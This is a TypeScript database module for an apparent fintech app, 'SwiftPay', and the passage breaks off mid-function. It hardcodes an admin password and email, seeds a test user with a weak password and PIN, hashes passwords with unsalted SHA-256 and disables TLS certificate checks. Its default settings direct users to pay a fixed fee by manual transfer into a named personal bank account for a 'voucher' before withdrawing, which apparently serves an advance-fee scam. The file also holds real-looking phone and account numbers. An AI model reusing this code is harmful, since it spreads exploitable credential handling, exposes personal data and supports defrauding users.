import pg from 'pg';
import path from 'path';
import fs from 'fs';
import crypto from 'crypto';

const { Pool } = pg;

const isPostgres = !!process.env.DATABASE_URL || !!process.env.SQL_HOST;
let pgPool: pg.Pool | null = null;

const JSON_FILE = path.join(process.cwd(), 'swiftpay_db.json');

// Default WDV config values
const DEFAULT_WDV_CONFIG = {
  bankName: "PalmPay",
  accountNumber: "8960723295",
  accountName: "pwamunadi ishaku",
  whatsappLink: "https://wa.me/2349162845073",
  voucherPrice: 6500,
  instructions: "Copy the system account details below. Make a manual bank transfer of the exact locked amount. Return here and click 'I have made this bank Transfer' to trigger operator check.",
  maintenanceNotice: "Wema Bank transfers are temporarily delayed. Please use other supported banks (like PalmPay or GTBank) for instant manual validation."
};

interface JsonData {
  users: any[];
  vouchers: any[];
  password_resets: any[];
  admin_settings: Record<string, string>;
  logs: any[];
  admins: any[];
  withdraw_requests: any[];
  wdv_payments: any[];
}

// -------------------- JSON DATABASE ENGINE FALLBACK --------------------
function safeStringifyJsonField(val: any): string {
  if (val === undefined || val === null) return '[]';
  if (typeof val === 'string') {
    try {
      const parsed = JSON.parse(val);
      if (typeof parsed === 'string') {
        return safeStringifyJsonField(parsed);
      }
      return val;
    } catch (e) {
      if (val.trim().startsWith('[') || val.trim().startsWith('{')) {
        return val;
      }
      return JSON.stringify(val);
    }
  }
  return JSON.stringify(val);
}

function getJsonDb(): JsonData {
  if (!fs.existsSync(JSON_FILE)) {
    const defaultSettings: Record<string, string> = {
      supportEmail: "support@swiftpay.com",
      supportPhone: "+2349162845073",
      whatsappNumber: "+2349162845073",
      senderName: "SwiftPay",
      videoUrl: "",
      recoveryEnabled: "true",
      smsRecoveryEnabled: "true",
      wdvBankName: "PalmPay",
      wdvAccountNumber: "8960723295",
      wdvAccountName: "pwamunadi ishaku",
      wdvVoucherPrice: "6500",
      wdvInstructions: "Copy the system account details below. Make a manual bank transfer of the exact locked amount. Return here and click 'I have made this bank Transfer' to trigger operator check.",
      wdvMaintenanceNotice: "Wema Bank transfers are temporarily delayed. Please use other supported banks (like PalmPay or GTBank) for instant manual validation."
    };
    const defaultUserPasswordHash = crypto.createHash('sha256').update('password123').digest('hex');
    const secureAdminPasswordHash = crypto.createHash('sha256').update('Boris$689').digest('hex');
    
    const initial: JsonData = {
      users: [
        {
          fullname: 'Adebayo Samuel',
          username: 'adebayo_samuel',
          email: 'user@example.com',
          phone: '08034567890',
          passwordhash: defaultUserPasswordHash,
          balance: 200000,
          dailytarget: 50000,
          dailyspent: 18400,
          pincreated: 1,
          pincode: '1234',
          biometricenabled: 1,
          profilepic: '',
          tier: 3,
          issuspended: 0,
          isfrozen: 0,
          registrationdate: new Date().toISOString(),
          accountstatus: 'active',
          beneficiaries: '[]',
          phonebeneficiaries: '[]',
          loginhistory: '[]',
          notifications: '[]',
          transactions: '[]'
        }
      ],
      vouchers: [],
      password_resets: [],
      admin_settings: defaultSettings,
      logs: [],
      admins: [
        {
          email: 'talkdavidjohn@gmail.com',
          passwordhash: secureAdminPasswordHash
        }
      ],
      withdraw_requests: [],
      wdv_payments: []
    };
    fs.writeFileSync(JSON_FILE, JSON.stringify(initial, null, 2));
    return initial;
  }
  
  try {
    const raw = fs.readFileSync(JSON_FILE, 'utf8');
    const parsed = JSON.parse(raw);
    
    // Normalize properties for database matching
    const data: JsonData = {
      users: (parsed.users || []).map((u: any) => ({
        fullname: u.fullName || u.fullname || '',
        username: u.username || '',
        email: (u.email || '').toLowerCase(),
        phone: u.phone || '',
        passwordhash: u.passwordHash || u.passwordhash || '',
        balance: Number(u.balance ?? 0),
        dailytarget: Number(u.dailyTarget ?? u.dailytarget ?? 50000),
        dailyspent: Number(u.dailySpent ?? u.dailyspent ?? 0),
        pincreated: u.pinCreated || u.pincreated ? 1 : 0,
        pincode: u.pinCode || u.pincode || '',
        biometricenabled: u.biometricEnabled || u.biometricenabled ? 1 : 0,
        profilepic: u.profilePic || u.profilepic || '',
        tier: Number(u.tier ?? 3),
        issuspended: u.isSuspended || u.issuspended ? 1 : 0,
        isfrozen: u.isFrozen || u.isfrozen ? 1 : 0,
        registrationdate: u.registrationDate || u.registrationdate || '',
        accountstatus: u.accountStatus || u.accountstatus || 'active',
        beneficiaries: safeStringifyJsonField(u.beneficiaries),
        phonebeneficiaries: safeStringifyJsonField(u.phonebeneficiaries || u.phoneBeneficiaries),
        loginhistory: safeStringifyJsonField(u.loginhistory || u.loginHistory),
        notifications: safeStringifyJsonField(u.notifications),
        transactions: safeStringifyJsonField(u.transactions),
        iswdvverified: u.isWdvVerified || u.iswdvverified ? 1 : 0,
        welcomerewardshown: u.welcomeRewardShown || u.welcomerewardshown ? 1 : 0
      })),
      vouchers: (parsed.vouchers || []).map((v: any) => ({
        code: v.code,
        amount: Number(v.amount ?? 0),
        status: v.status || 'unused',
        usedby: v.usedBy || v.usedby || '',
        usedat: v.usedAt || v.usedat || ''
      })),
      password_resets: (parsed.password_resets || parsed.passwordResets || []).map((r: any) => ({
        id: r.id || r.token || '',
        emailorphone: r.emailorphone || r.email || '',
        otp: r.otp || '',
        expiresat: Number(r.expiresAt || r.expiresat || 0),
        used: r.used ? 1 : 0,
        createdat: Number(r.createdAt || r.createdat || 0)
      })),
      admin_settings: parsed.admin_settings || {},
      logs: (parsed.logs || []).map((l: any) => ({
        id: l.id,
        timestamp: l.timestamp,
        message: l.message,
        type: l.type
      })),
      admins: (parsed.admins || []).map((a: any) => ({
        email: (a.email || '').toLowerCase(),
        passwordhash: a.passwordHash || a.passwordhash || ''
      })),
      withdraw_requests: (parsed.withdraw_requests || parsed.withdrawRequests || []).map((w: any) => ({
        id: w.id || '',
        userId: w.userId || w.userid || '',
        email: w.email || '',
        phone: w.phone || '',
        amount: Number(w.amount || 0),
        bankName: w.bankName || w.bankname || '',
        accountNumber: w.accountNumber || w.accountnumber || '',
        accountName: w.accountName || w.accountname || '',
        reference: w.reference || '',
        status: w.status || 'Pending',
        timestamp: w.timestamp || w.created_at || new Date().toISOString(),
        created_at: w.created_at || w.timestamp || new Date().toISOString(),
        adminNotes: w.adminNotes || w.adminnotes || '',
        posSlipPath: w.posSlipPath || w.posslippath || '',
        posSlipUploadedAt: w.posSlipUploadedAt || w.posslipuploadedat || ''
      })),
      wdv_payments: (parsed.wdv_payments || parsed.wdvPayments || []).map((p: any) => ({
        id: p.id || '',
        reference: p.reference || '',
        userEmail: (p.userEmail || p.useremail || '').toLowerCase(),
        amount: Number(p.amount || 0),
        bankName: p.bankName || p.bankname || '',
        accountNumber: p.accountNumber || p.accountnumber || '',
        accountName: p.accountName || p.accountname || '',
        status: p.status || 'pending',
        createdAt: p.createdAt || p.createdat || new Date().toISOString(),
        expiresAt: p.expiresAt || p.expiresat || '',
        paidAt: p.paidAt || p.paidat || '',
        voucherCode: p.voucherCode || p.vouchercode || '',
        provider: p.provider || 'manual_transfer',
        webhookData: p.webhookData || p.webhookdata || ''
      }))
    };

    // Migrations
    if (Object.keys(data.admin_settings).length === 0 && (parsed.bpcConfig || parsed.wdvConfig)) {
      const c = parsed.wdvConfig || parsed.bpcConfig;
      data.admin_settings = {
        supportEmail: "support@swiftpay.com",
        supportPhone: "+2349162845073",
        whatsappNumber: "+2349162845073",
        senderName: "SwiftPay",
        videoUrl: "",
        recoveryEnabled: "true",
        smsRecoveryEnabled: "true",
        wdvBankName: c.bankName,
        wdvAccountNumber: c.accountNumber,
        wdvAccountName: c.accountName,
        wdvVoucherPrice: String(c.voucherPrice),
        wdvInstructions: c.instructions,
        wdvMaintenanceNotice: c.maintenanceNotice
      };
    } else {
      // Migrate bpc settings to wdv settings in database settings
      if (data.admin_settings.bpcBankName && !data.admin_settings.wdvBankName) {
        data.admin_settings.wdvBankName = data.admin_settings.bpcBankName;
        data.admin_settings.wdvAccountNumber = data.admin_settings.bpcAccountNumber;
        data.admin_settings.wdvAccountName = data.admin_settings.bpcAccountName;
        data.admin_settings.wdvVoucherPrice = data.admin_settings.bpcVoucherPrice;
        data.admin_settings.wdvInstructions = data.admin_settings.bpcInstructions;
        data.admin_settings.wdvMaintenanceNotice = data.admin_settings.bpcMaintenanceNotice;
      }
      if (data.admin_settings.videoUrl && data.admin_settings.videoUrl.includes('youtube')) {
        data.admin_settings.videoUrl = '';
      }
    }

    return data;
  } catch (err) {
    console.error('Error loading JSON DB:', err);
    return {
      users: [],
      vouchers: [],
      password_resets: [],
      admin_settings: {},
      logs: [],
      admins: [],
      withdraw_requests: [],
      wdv_payments: []
    };
  }
}

function saveJsonDb(data: JsonData) {
  try {
    fs.writeFileSync(JSON_FILE, JSON.stringify(data, null, 2));
  } catch (err) {
    console.error('Error saving JSON DB:', err);
  }
}

// -------------------- DATABASE INITIALIZATION --------------------
export async function initDb() {
  if (isPostgres) {
    console.log('[SwiftPay DB] Connecting to PostgreSQL database (Admin privileges for Schema setup)...');
    if (process.env.SQL_HOST) {
      console.log('[SwiftPay DB] Using Cloud SQL socket/host connection params with ADMIN privileges...');
      pgPool = new Pool({
        host: process.env.SQL_HOST,
        user: process.env.SQL_ADMIN_USER || process.env.SQL_USER,
        password: process.env.SQL_ADMIN_PASSWORD || process.env.SQL_PASSWORD,
        database: process.env.SQL_DB_NAME,
        connectionTimeoutMillis: 15000,
      });
    } else {
      console.log('[SwiftPay DB] Using DATABASE_URL connection string...');
      pgPool = new Pool({
        connectionString: process.env.DATABASE_URL,
        ssl: process.env.DATABASE_URL && process.env.DATABASE_URL.includes('localhost') ? false : { rejectUnauthorized: false }
      });
    }
  } else {
    console.log(`[SwiftPay DB] No DATABASE_URL or SQL_HOST found. Initializing pure JS JSON database fallback at ${JSON_FILE}...`);
    getJsonDb(); // ensure initialized
  }

  // Create tables if they do not exist (PostgreSQL or local stub run)
  await execute(`
    CREATE TABLE IF NOT EXISTS users (
      fullName TEXT,
      username TEXT,
      email TEXT PRIMARY KEY,
      phone TEXT,
      passwordHash TEXT,
      balance REAL,
      dailyTarget REAL,
      dailySpent REAL,
      pinCreated INTEGER,
      pinCode TEXT,
      biometricEnabled INTEGER,
      profilePic TEXT,
      tier INTEGER,
      isSuspended INTEGER,
      isFrozen INTEGER,
      registrationDate TEXT,
      accountStatus TEXT,
      beneficiaries TEXT,
      phoneBeneficiaries TEXT,
      loginHistory TEXT,
      notifications TEXT,
      transactions TEXT,
      wdvVerified INTEGER DEFAULT 0,
      isWdvVerified INTEGER DEFAULT 0,
      welcomeRewardShown INTEGER DEFAULT 0,
      giftDay INTEGER DEFAULT 0,
      giftActive INTEGER DEFAULT 1,
      lastGiftCreditTime TEXT,
      giftExpiresAt TEXT
    )
  `);

  try {
    await execute(`ALTER TABLE users ADD COLUMN IF NOT EXISTS wdvVerified INTEGER DEFAULT 0`);
  } catch (e) {}
  try {
    await execute(`ALTER TABLE users ADD COLUMN IF NOT EXISTS isWdvVerified INTEGER DEFAULT 0`);
  } catch (e) {}
  try {
    await execute(`ALTER TABLE users ADD COLUMN IF NOT EXISTS welcomeRewardShown INTEGER DEFAULT 0`);
  } catch (e) {}
  try {
    await execute(`ALTER TABLE users ADD COLUMN IF NOT EXISTS giftDay INTEGER DEFAULT 0`);
  } catch (e) {}
  try {
    await execute(`ALTER TABLE users ADD COLUMN IF NOT EXISTS giftActive INTEGER DEFAULT 1`);
  } catch (e) {}
  try {
    await execute(`ALTER TABLE users ADD COLUMN IF NOT EXISTS lastGiftCreditTime TEXT`);
  } catch (e) {}
  try {
    await execute(`ALTER TABLE users ADD COLUMN IF NOT EXISTS giftExpiresAt TEXT`);
  } catch (e) {}
  try {
    await execute(`ALTER TABLE vouchers ADD COLUMN IF NOT EXISTS redeemedBy TEXT DEFAULT '[]'`);
  } catch (e) {}

  await execute(`
    CREATE TABLE IF NOT EXISTS wallets (
      id TEXT PRIMARY KEY,
      userId TEXT,
      balance REAL,
      currency TEXT
    )
  `);

  await execute(`
    CREATE TABLE IF NOT EXISTS transactions (
      id TEXT PRIMARY KEY,
      userId TEXT,
      amount REAL,
      type TEXT,
      status TEXT,
      reference TEXT,
      timestamp TEXT
    )
  `);

  await execute(`
    CREATE TABLE IF NOT EXISTS notifications (
      id TEXT PRIMARY KEY,
      userId TEXT,
      title TEXT,
      message TEXT,
      isRead INTEGER,
      timestamp TEXT
    )
  `);

  await execute(`
    CREATE TABLE IF NOT EXISTS activity_ticker (
      id TEXT PRIMARY KEY,
      message TEXT,
      timestamp TEXT
    )
  `);

  await execute(`
    CREATE TABLE IF NOT EXISTS system_settings (
      key TEXT PRIMARY KEY,
      value TEXT
    )
  `);

  await execute(`
    CREATE TABLE IF NOT EXISTS admins (
      email TEXT PRIMARY KEY,
      passwordHash TEXT
    )
  `);

  await execute(`
    CREATE TABLE IF NOT EXISTS password_reset_tokens (
      id TEXT PRIMARY KEY,
      email TEXT,
      token TEXT,
      expiresAt INTEGER,
      used INTEGER
    )
  `);

  await execute(`
    CREATE TABLE IF NOT EXISTS email_verification (
      id TEXT PRIMARY KEY,
      email TEXT,
      code TEXT,
      expiresAt INTEGER,
      verified INTEGER
    )
  `);

  await execute(`
    CREATE TABLE IF NOT EXISTS b_voucher_codes (
      code TEXT PRIMARY KEY,
      amount REAL,
      status TEXT
    )
  `);

  await execute(`
    CREATE TABLE IF NOT EXISTS withdraw_requests (
      id TEXT PRIMARY KEY,
      userId TEXT,
      email TEXT,
      amount REAL,
      bankName TEXT,
      accountNumber TEXT,
      accountName TEXT,
      status TEXT,
      timestamp TEXT,
      reference TEXT,
      voucherCode TEXT,
      notes TEXT,
      posSlipPath TEXT,
      posSlipUploadedAt TEXT,
      posSlipUploadedBy TEXT
    )
  `);

  await execute(`
    CREATE TABLE IF NOT EXISTS saved_recipients (
      id TEXT PRIMARY KEY,
      userId TEXT,
      name TEXT,
      bankName TEXT,
      accountNumber TEXT
    )
  `);

  await execute(`
    CREATE TABLE IF NOT EXISTS saved_banks (
      id TEXT PRIMARY KEY,
      code TEXT,
      name TEXT
    )
  `);

  // Extra tables required by server
  await execute(`
    CREATE TABLE IF NOT EXISTS wdv_payments (
      id TEXT PRIMARY KEY,
      reference TEXT UNIQUE,
      userEmail TEXT,
      amount REAL,
      bankName TEXT,
      accountNumber TEXT,
      accountName TEXT,
      status TEXT,
      createdAt TEXT,
      expiresAt TEXT,
      paidAt TEXT,
      voucherCode TEXT,
      provider TEXT,
      webhookData TEXT
    )
  `);

  await execute(`
    CREATE TABLE IF NOT EXISTS vouchers (
      id TEXT PRIMARY KEY,
      voucherCode TEXT UNIQUE,
      code TEXT,
      amount REAL,
      status TEXT,
      usedBy TEXT,
      usedAt TEXT,
      redeemedBy TEXT DEFAULT '[]',
      generatedAt TEXT,
      withdrawalId TEXT,
      purchasedBy TEXT
    )
  `);

  await execute(`
    CREATE TABLE IF NOT EXISTS ai_chat_logs (
      id TEXT PRIMARY KEY,
      session_id TEXT,
      user_email TEXT,
      user_message TEXT,
      ai_response TEXT,
      escalated_to_whatsapp INTEGER DEFAULT 0,
      is_unanswered INTEGER DEFAULT 0,
      timestamp TEXT
    )
  `);

  await execute(`
    CREATE TABLE IF NOT EXISTS ai_custom_faqs (
      id TEXT PRIMARY KEY,
      question TEXT,
      answer TEXT,
      created_at TEXT
    )
  `);

  // Run ALTER TABLE migrations for existing databases
  try {
    await execute(`ALTER TABLE withdraw_requests ADD COLUMN email TEXT`);
  } catch (e) {}
  try {
    await execute(`ALTER TABLE withdraw_requests ADD COLUMN accountName TEXT`);
  } catch (e) {}
  try {
    await execute(`ALTER TABLE withdraw_requests ADD COLUMN reference TEXT`);
  } catch (e) {}
  try {
    await execute(`ALTER TABLE withdraw_requests ADD COLUMN voucherCode TEXT`);
  } catch (e) {}
  try {
    await execute(`ALTER TABLE withdraw_requests ADD COLUMN notes TEXT`);
  } catch (e) {}
  try {
    await execute(`ALTER TABLE withdraw_requests ADD COLUMN posSlipPath TEXT`);
  } catch (e) {}
  try {
    await execute(`ALTER TABLE withdraw_requests ADD COLUMN posSlipUploadedAt TEXT`);
  } catch (e) {}
  try {
    await execute(`ALTER TABLE withdraw_requests ADD COLUMN posSlipUploadedBy TEXT`);
  } catch (e) {}

  try {
    await execute(`ALTER TABLE users ADD COLUMN wdvVerified INTEGER DEFAULT 0`);
  } catch (e) {
    // Column already exists
  }
  try {
    await execute(`ALTER TABLE vouchers ADD COLUMN redeemedBy TEXT DEFAULT '[]'`);
  } catch (e) {
    // Column already exists
  }
  try {
    await execute(`ALTER TABLE vouchers ADD COLUMN id TEXT`);
  } catch (e) {
    // Column already exists
  }
  try {
    await execute(`ALTER TABLE vouchers ADD COLUMN voucherCode TEXT`);
  } catch (e) {
    // Column already exists
  }
  try {
    await execute(`ALTER TABLE vouchers ADD COLUMN generatedAt TEXT`);
  } catch (e) {
    // Column already exists
  }
  try {
    await execute(`ALTER TABLE vouchers ADD COLUMN withdrawalId TEXT`);
  } catch (e) {
    // Column already exists
  }
  try {
    await execute(`ALTER TABLE vouchers ADD COLUMN purchasedBy TEXT`);
  } catch (e) {
    // Column already exists
  }
  try {
    await execute(`UPDATE vouchers SET id = code WHERE id IS NULL`);
  } catch (e) {
    // Update failed
  }
  try {
    await execute(`UPDATE vouchers SET voucherCode = code WHERE voucherCode IS NULL`);
  } catch (e) {
    // Update failed
  }

  await execute(`
    CREATE TABLE IF NOT EXISTS password_resets (
      id TEXT PRIMARY KEY,
      emailOrPhone TEXT,
      otp TEXT,
      expiresAt INTEGER,
      used INTEGER,
      createdAt INTEGER
    )
  `);

  await execute(`
    CREATE TABLE IF NOT EXISTS admin_settings (
      key TEXT PRIMARY KEY,
      value TEXT
    )
  `);

  await execute(`
    CREATE TABLE IF NOT EXISTS logs (
      id TEXT PRIMARY KEY,
      timestamp TEXT,
      message TEXT,
      type TEXT
    )
  `);

  // Seed default admin if not exists
  const secureAdminPasswordHash = crypto.createHash('sha256').update('Boris$689').digest('hex');
  const existingAdmin = await getRow(`SELECT * FROM admins WHERE email = $1`, ['talkdavidjohn@gmail.com']);
  if (!existingAdmin) {
    await execute(
      `INSERT INTO admins (email, passwordHash) VALUES ($1, $2)`,
      ['talkdavidjohn@gmail.com', secureAdminPasswordHash]
    );
    console.log('[SwiftPay DB] Default secure admin seeded.');
  }

  // Seed initial user if database is empty
  const defaultUserPasswordHash = crypto.createHash('sha256').update('password123').digest('hex');
  const userCount = await getRow(`SELECT COUNT(*) as count FROM users`);
  if (!userCount || Number(userCount.count || 0) === 0) {
    await execute(
      `INSERT INTO users (
        fullName, username, email, phone, passwordHash, balance, dailyTarget, dailySpent,
        pinCreated, pinCode, biometricEnabled, profilePic, tier, isSuspended, isFrozen,
        registrationDate, accountStatus, beneficiaries, phoneBeneficiaries, loginHistory,
        notifications, transactions
      ) VALUES ($1, $2, $3, $4, $5, $6, $7, $8, $9, $10, $11, $12, $13, $14, $15, $16, $17, $18, $19, $20, $21, $22)`,
      [
        'Adebayo Samuel', 'adebayo_samuel', 'user@example.com', '08034567890', defaultUserPasswordHash,
        200000, 50000, 18400, 1, '1234', 1, '', 3, 0, 0,
        new Date().toISOString(), 'active', '[]', '[]', '[]', '[]', '[]'
      ]
    );
    console.log('[SwiftPay DB] Default user seeded.');
  }

  // Seed vouchers if empty (no hardcoded vouchers should be seeded)

  // Seed default admin settings if not present
  const settingsCount = await getRow(`SELECT COUNT(*) as count FROM admin_settings`);
  if (!settingsCount || Number(settingsCount.count || 0) === 0) {
    const defaultSettings: Record<string, string> = {
      supportEmail: "support@swiftpay.com",
      supportPhone: "+2349162845073",
      whatsappNumber: "+2349162845073",
      senderName: "SwiftPay",
      videoUrl: "",
      recoveryEnabled: "true",
      smsRecoveryEnabled: "true",
      wdvBankName: "PalmPay",
      wdvAccountNumber: "8960723295",
      wdvAccountName: "pwamunadi ishaku",
      wdvVoucherPrice: "6500",
      wdvInstructions: "Copy the system account details below. Make a manual bank transfer of the exact locked amount. Return here and click 'I have made this bank Transfer' to trigger operator check.",
      wdvMaintenanceNotice: "Wema Bank transfers are temporarily delayed. Please use other supported banks (like PalmPay or GTBank) for instant manual validation."
    };

    for (const [key, value] of Object.entries(defaultSettings)) {
      await execute(`INSERT INTO admin_settings (key, value) VALUES ($1, $2) ON CONFLICT(key) DO UPDATE SET value = $2`, [key, value]);
    }
    console.log('[SwiftPay DB] Default admin settings seeded.');
  }

  // Reinitialize the pool with App user (least privilege) for runtime database access
  if (isPostgres) {
    console.log('[SwiftPay DB] Schema setup and seeding complete. Switching database connection pool to App user (least privilege)...');
    try {
      if (pgPool) {
        await pgPool.end();
      }
    } catch (err) {
      console.error('[SwiftPay DB] Error closing Admin pool:', err);
    }
    
    if (process.env.SQL_HOST) {
      pgPool = new Pool({
        host: process.env.SQL_HOST,
        user: process.env.SQL_USER,
        password: process.env.SQL_PASSWORD,
        database: process.env.SQL_DB_NAME,
        connectionTimeoutMillis: 15000,
      });
    } else {
      pgPool = new Pool({
        connectionString: process.env.DATABASE_URL,
        ssl: process.env.DATABASE_URL && process.env.DATABASE_URL.includes('localhost') ? false : { rejectUnauthorized: false }
      });
    }
  }
}

// -------------------- QUERY EXECUTION CONTROLLER --------------------
export function execute(sql: string, params: any[] = []): Promise<any> {
  return new Promise((resolve, reject) => {
    if (isPostgres) {
      if (!pgPool) {
        return reject(new Error('PostgreSQL pool not initialized.'));
      }
      pgPool.query(sql, params, (err, res) => {
        if (err) return reject(err);
        resolve(res);
      });
    } else {
      // In-memory pure JS simulator for development mode
      try {
        const db = getJsonDb();
        const sqlUpper = sql.toUpperCase();

        if (sqlUpper.includes('INSERT INTO ADMINS')) {
          const email = (params[0] || '').toLowerCase();
          const hash = params[1] || '';
          db.admins = db.admins.filter(a => a.email !== email);
          db.admins.push({ email, passwordhash: hash });
        } else if (sqlUpper.includes('INSERT INTO USERS')) {
          const u: any = {
            fullname: params[0],
            username: params[1],
            email: (params[2] || '').toLowerCase(),
            phone: params[3],
            passwordhash: params[4],
            balance: Number(params[5] ?? 0),
            dailytarget: Number(params[6] ?? 50000),
            dailyspent: Number(params[7] ?? 0),
            pincreated: Number(params[8] ?? 0),
            pincode: params[9] || '',
            biometricenabled: Number(params[10] ?? 0),
            profilepic: params[11] || '',
            tier: Number(params[12] ?? 3),
            issuspended: Number(params[13] ?? 0),
            isfrozen: Number(params[14] ?? 0),
            registrationdate: params[15] || new Date().toISOString(),
            accountstatus: params[16] || 'active',
            beneficiaries: params[17] || '[]',
            phonebeneficiaries: params[18] || '[]',
            loginhistory: params[19] || '[]',
            notifications: params[20] || '[]',
            transactions: params[21] || '[]',
            wdvverified: Number(params[22] ?? 0),
            iswdvverified: Number(params[23] ?? 0),
            welcomerewardshown: Number(params[24] ?? 0),
            giftday: Number(params[25] ?? 0),
            giftactive: Number(params[26] ?? 1),
            lastgiftcredittime: params[27] || '',
            giftexpiresat: params[28] || ''
          };
          db.users = db.users.filter(x => x.email !== u.email);
          db.users.push(u);
        } else if (sqlUpper.includes('INSERT INTO VOUCHERS')) {
          const v = {
            code: params[0],
            amount: Number(params[1] ?? 0),
            status: params[2] || 'unused',
            usedby: params[3] || '',
            usedat: params[4] || ''
          };
          db.vouchers = db.vouchers.filter(x => x.code !== v.code);
          db.vouchers.push(v);
        } else if (sqlUpper.includes('INSERT INTO WDV_PAYMENTS')) {
          const p = {
            id: params[0],
            reference: params[1],
            useremail: (params[2] || '').toLowerCase(),
            amount: Number(params[3] ?? 0),
            bankname: params[4],
            accountnumber: params[5],
            accountname: params[6],
            status: params[7] || 'pending',
            createdat: params[8] || new Date().toISOString(),
            expiresat: params[9] || '',
            paidat: params[10] || '',
            vouchercode: params[11] || '',
            provider: params[12] || 'manual_transfer',
            webhookdata: params[13] || ''
          };
          db.wdv_payments = db.wdv_payments || [];
          db.wdv_payments = db.wdv_payments.filter((x: any) => x.reference !== p.reference && x.id !== p.id);
          db.wdv_payments.push(p);
        } else if (sqlUpper.includes('UPDATE WDV_PAYMENTS')) {
          db.wdv_payments = db.wdv_payments || [];
          const refParam = params[params.length - 1]; // reference is usually last param
          const p = db.wdv_payments.find((x: any) => x.reference === refParam || x.id === refParam);
          if (p) {
            if (sqlUpper.includes('STATUS =') || sqlUpper.includes('STATUS=')) {
              p.status = params[0];
            }
            if (sqlUpper.includes('PAIDAT =') || sqlUpper.includes('PAIDAT=')) {
              p.paidat = params[1] || new Date().toISOString();
            }
            if (sqlUpper.includes('VOUCHERCODE =') || sqlUpper.includes('VOUCHERCODE=')) {
              p.vouchercode = params[2] || params[1] || '';
            }
          }
        } else if (sqlUpper.includes('INSERT INTO WITHDRAW_REQUESTS')) {
          const w = {
            id: params[0],
            userid: params[1],
            email: params[2],
            amount: Number(params[3] ?? 0),
            bankname: params[4],
            accountnumber: params[5],
            accountname: params[6],
            status: params[7] || 'pending',
            timestamp: params[8] || new Date().toISOString(),
            reference: params[9],
            vouchercode: params[10] || '',
            notes: params[11] || '',
            posSlippath: params[12] || '',
            posSlipuploadedAt: params[13] || '',
            posSlipuploadedBy: params[14] || ''
          };
          db.withdraw_requests = db.withdraw_requests || [];
          db.withdraw_requests = db.withdraw_requests.filter((x: any) => x.id !== w.id);
          db.withdraw_requests.push(w);
        } else if (sqlUpper.includes('UPDATE WITHDRAW_REQUESTS')) {
          db.withdraw_requests = db.withdraw_requests || [];
          const idParam = params.find(p => typeof p === 'string' && p.startsWith('tx-'));
          if (idParam) {
            const req = db.withdraw_requests.find((x: any) => x.id === idParam);
            if (req) {
              if (sqlUpper.includes('STATUS =') || sqlUpper.includes('STATUS=')) {
                if (sqlUpper.includes('STATUS =') && sqlUpper.includes('NOTES =')) {
                  req.status = params[0];
                  req.notes = params[1];
                } else {
                  req.status = params[0];
                }
              }
              if (sqlUpper.includes('NOTES =') || sqlUpper.includes('NOTES=')) {
                if (!sqlUpper.includes('STATUS =')) {
                  req.notes = params[0];
                }
              }
              if (sqlUpper.includes('POSSLIPPATH =') || sqlUpper.includes('POSSLIPPATH=')) {
                req.posSlippath = params[0];
                req.posSlipuploadedAt = params[1];
                req.posSlipuploadedBy = params[2];
              }
            }
          }
        } else if (sqlUpper.includes('INSERT INTO PASSWORD_RESETS')) {
          const r = {
            id: params[0],
            emailorphone: (params[1] || '').toLowerCase(),
            otp: params[2],
            expiresat: Number(params[3] ?? 0),
            used: Number(params[4] ?? 0),
            createdat: Number(params[5] ?? Date.now())
          };
          db.password_resets = db.password_resets.filter(x => x.id !== r.id);
          db.password_resets.push(r);
        } else if (sqlUpper.includes('INSERT INTO ADMIN_SETTINGS')) {
          db.admin_settings[params[0]] = String(params[1] ?? '');
        } else if (sqlUpper.includes('INSERT INTO LOGS')) {
          const log = {
            id: params[0],
            timestamp: params[1] || new Date().toISOString(),
            message: params[2] || '',
            type: params[3] || 'INFO'
          };
          db.logs.unshift(log);
          if (db.logs.length > 500) {
            db.logs.pop();
          }
        }
        
        saveJsonDb(db);
        resolve({ rows: [], lastID: Date.now(), changes: 1 });
      } catch (err) {
        reject(err);
      }
    }
  });
}

export function getRow(sql: string, params: any[] = []): Promise<any> {
  return new Promise((resolve, reject) => {
    if (isPostgres) {
      if (!pgPool) {
        return reject(new Error('PostgreSQL pool not initialized.'));
      }
      pgPool.query(sql, params, (err, res) => {
        if (err) return reject(err);
        resolve(res.rows[0] || null);
      });
    } else {
      try {
        const db = getJsonDb();
        const sqlUpper = sql.toUpperCase();

        if (sqlUpper.includes('SELECT COUNT(*) AS COUNT FROM USERS')) {
          return resolve({ count: db.users.length });
        }
        if (sqlUpper.includes('SELECT COUNT(*) AS COUNT FROM VOUCHERS')) {
          return resolve({ count: db.vouchers.length });
        }
        if (sqlUpper.includes('SELECT COUNT(*) AS COUNT FROM ADMIN_SETTINGS')) {
          return resolve({ count: Object.keys(db.admin_settings).length });
        }
        if (sqlUpper.includes('FROM ADMINS WHERE EMAIL')) {
          const email = (params[0] || '').toLowerCase();
          const row = db.admins.find(a => a.email === email);
          return resolve(row || null);
        }
        if (sqlUpper.includes('FROM USERS WHERE EMAIL')) {
          const email = (params[0] || '').toLowerCase();
          const row = db.users.find(u => u.email === email);
          return resolve(row || null);
        }
        if (sqlUpper.includes('FROM VOUCHERS WHERE CODE')) {
          const code = params[0] || '';
          const row = db.vouchers.find(v => v.code === code);
          return resolve(row || null);
        }
        if (sqlUpper.includes('FROM WITHDRAW_REQUESTS WHERE ID')) {
          db.withdraw_requests = db.withdraw_requests || [];
          const idVal = params[0];
          const row = db.withdraw_requests.find((w: any) => w.id === idVal);
          return resolve(row || null);
        }
        if (sqlUpper.includes('FROM WDV_PAYMENTS WHERE REFERENCE')) {
          db.wdv_payments = db.wdv_payments || [];
          const refVal = params[0];
          const row = db.wdv_payments.find((p: any) => p.reference === refVal || p.id === refVal);
          return resolve(row || null);
        }
        
        resolve(null);
      } catch (err) {
        reject(err);
      }
    }
  });
}

export function getAllRows(sql: string, params: any[] = []): Promise<any[]> {
  return new Promise((resolve, reject) => {
    if (isPostgres) {
      if (!pgPool) {
        return reject(new Error('PostgreSQL pool not initialized.'));
      }
      pgPool.query(sql, params, (err, res) => {
        if (err) return reject(err);
        resolve(res.rows);
      });
    } else {
      try {
        const db = getJsonDb();
        const sqlUpper = sql.toUpperCase();

        if (sqlUpper.includes('FROM ADMIN_SETTINGS')) {
          const rows = Object.entries(db.admin_settings).map(([key, value]) => ({ key, value }));
          return resolve(rows);
        }
        if (sqlUpper.includes('FROM USERS')) {
          return resolve(db.users);
        }
        if (sqlUpper.includes('FROM VOUCHERS')) {
          return resolve(db.vouchers);
        }
        if (sqlUpper.includes('FROM PASSWORD_RESETS')) {
          return resolve(db.password_resets);
        }
        if (sqlUpper.includes('FROM LOGS')) {
          return resolve(db.logs);
        }
        if (sqlUpper.includes('FROM WITHDRAW_REQUESTS')) {
